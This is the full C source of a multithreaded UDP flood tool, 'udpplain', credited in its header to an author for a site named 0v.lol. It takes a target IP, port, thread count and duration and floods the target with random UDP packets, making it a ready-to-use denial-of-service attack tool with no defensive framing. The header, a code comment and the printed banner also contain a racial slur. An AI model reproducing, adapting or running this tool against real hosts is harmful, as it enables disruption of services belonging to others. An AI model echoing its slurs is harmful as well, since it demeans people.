/*
 * UDP Plain Flood - Standalone x86/x64
 * by c0re_x64 for 0v.lol // nigga
 * usage: sudo ./udpplain <ip> <port> <threads> <duration> [--size N][--static]
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <signal.h>
#include <time.h>
#include <errno.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/types.h>

struct udpplain_config {
    char target_ip[32];
    uint16_t target_port;
    uint32_t threads;
    uint32_t duration;
    uint16_t sport, dport, data_len;
    uint8_t data_random;
    volatile uint8_t running;
    uint64_t total_packets, total_bytes;
};

static struct udpplain_config config;
static pthread_mutex_t stats_mutex = PTHREAD_MUTEX_INITIALIZER;
static uint32_t rand_state[4];

static void rand_init(void) {
    rand_state[0] = time(NULL); rand_state[1] = getpid() ^ getppid();
    rand_state[2] = clock(); rand_state[3] = rand_state[2] ^ rand_state[1];
}

static uint32_t rand_next(void) {
    uint32_t t = rand_state[0]; t ^= t << 11; t ^= t >> 8;
    rand_state[0] = rand_state[1]; rand_state[1] = rand_state[2];
    rand_state[2] = rand_state[3]; rand_state[3] ^= rand_state[3] >> 19; rand_state[3] ^= t;
    return rand_state[3];
}

static void rand_bytes(char *b, int n) {
    while (n > 0) { if (n >= 4) { *((uint32_t *)b) = rand_next(); b += 4; n -= 4; } else { *b++ = rand_next() & 0xFF; n--; } }
}

// nigga udpplain
static void* udpplain_thread(void *arg) {
    int tid = *(int *)arg; free(arg);
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) { fprintf(stderr, "[%d] socket\n", tid); return NULL; }
    struct sockaddr_in bind_a = { .sin_family = AF_INET, .sin_addr.s_addr = 0 };
    bind_a.sin_port = (config.sport == 0xFFFF) ? htons(rand_next() % 60000 + 1024) : htons(config.sport);
    bind(sock, (struct sockaddr *)&bind_a, sizeof(bind_a));
    struct sockaddr_in target = { .sin_family = AF_INET };
    target.sin_addr.s_addr = inet_addr(config.target_ip);
    target.sin_port = htons((config.dport == 0xFFFF) ? config.target_port : config.dport);
    connect(sock, (struct sockaddr *)&target, sizeof(target));
    char *data = malloc(config.data_len);
    if (!data) { close(sock); return NULL; }
    uint64_t pkts = 0, bytes = 0;
    time_t end = time(NULL) + config.duration;
    printf("[thread %d] started\n", tid);
    while (config.running && time(NULL) < end) {
        if (config.data_random) rand_bytes(data, config.data_len);
        int sent = send(sock, data, config.data_len, MSG_NOSIGNAL);
        if (sent > 0) { pkts++; bytes += sent; }
    }
    pthread_mutex_lock(&stats_mutex);
    config.total_packets += pkts; config.total_bytes += bytes;
    pthread_mutex_unlock(&stats_mutex);
    printf("[thread %d] stopped %llu %llu\n", tid, (unsigned long long)pkts, (unsigned long long)bytes);
    free(data); close(sock);
    return NULL;
}

static void sigint_handler(int sig) { (void)sig; config.running = 0; }

int main(int argc, char **argv) {
    if (argc < 5) { printf("udpplain <ip> <port> <threads> <duration> [--size N][--static]\n"); return 1; }
    if (geteuid() != 0) { fprintf(stderr, "root\n"); return 1; }
    memset(&config, 0, sizeof(config));
    strncpy(config.target_ip, argv[1], sizeof(config.target_ip) - 1);
    config.target_port = atoi(argv[2]); config.threads = atoi(argv[3]); config.duration = atoi(argv[4]);
    config.sport = 0xFFFF; config.dport = config.target_port;
    config.data_len = 512; config.data_random = 1; config.running = 1;
    for (int i = 5; i < argc; i++) {
        if (strcmp(argv[i], "--sport") == 0 && i+1 < argc) config.sport = atoi(argv[++i]);
        else if (strcmp(argv[i], "--dport") == 0 && i+1 < argc) config.dport = atoi(argv[++i]);
        else if (strcmp(argv[i], "--size") == 0 && i+1 < argc) config.data_len = atoi(argv[++i]);
        else if (strcmp(argv[i], "--static") == 0) config.data_random = 0;
    }
    if (config.threads < 1 || config.threads > 256 || config.duration < 1) return 1;
    rand_init();
    signal(SIGINT, sigint_handler); signal(SIGTERM, sigint_handler);
    printf("\n UDP Plain - by c0re_x64 for 0v.lol // nigga\n\n");
    pthread_t *threads = malloc(config.threads * sizeof(pthread_t));
    if (!threads) return 1;
    for (uint32_t i = 0; i < config.threads; i++) {
        int *p = malloc(sizeof(int)); *p = i + 1;
        pthread_create(&threads[i], NULL, udpplain_thread, p);
        usleep(100000);
    }
    for (uint32_t i = 0; i < config.threads; i++) pthread_join(threads[i], NULL);
    free(threads);
    printf("\n[*] done %llu %llu\n", (unsigned long long)config.total_packets, (unsigned long long)config.total_bytes);
    return 0;
}
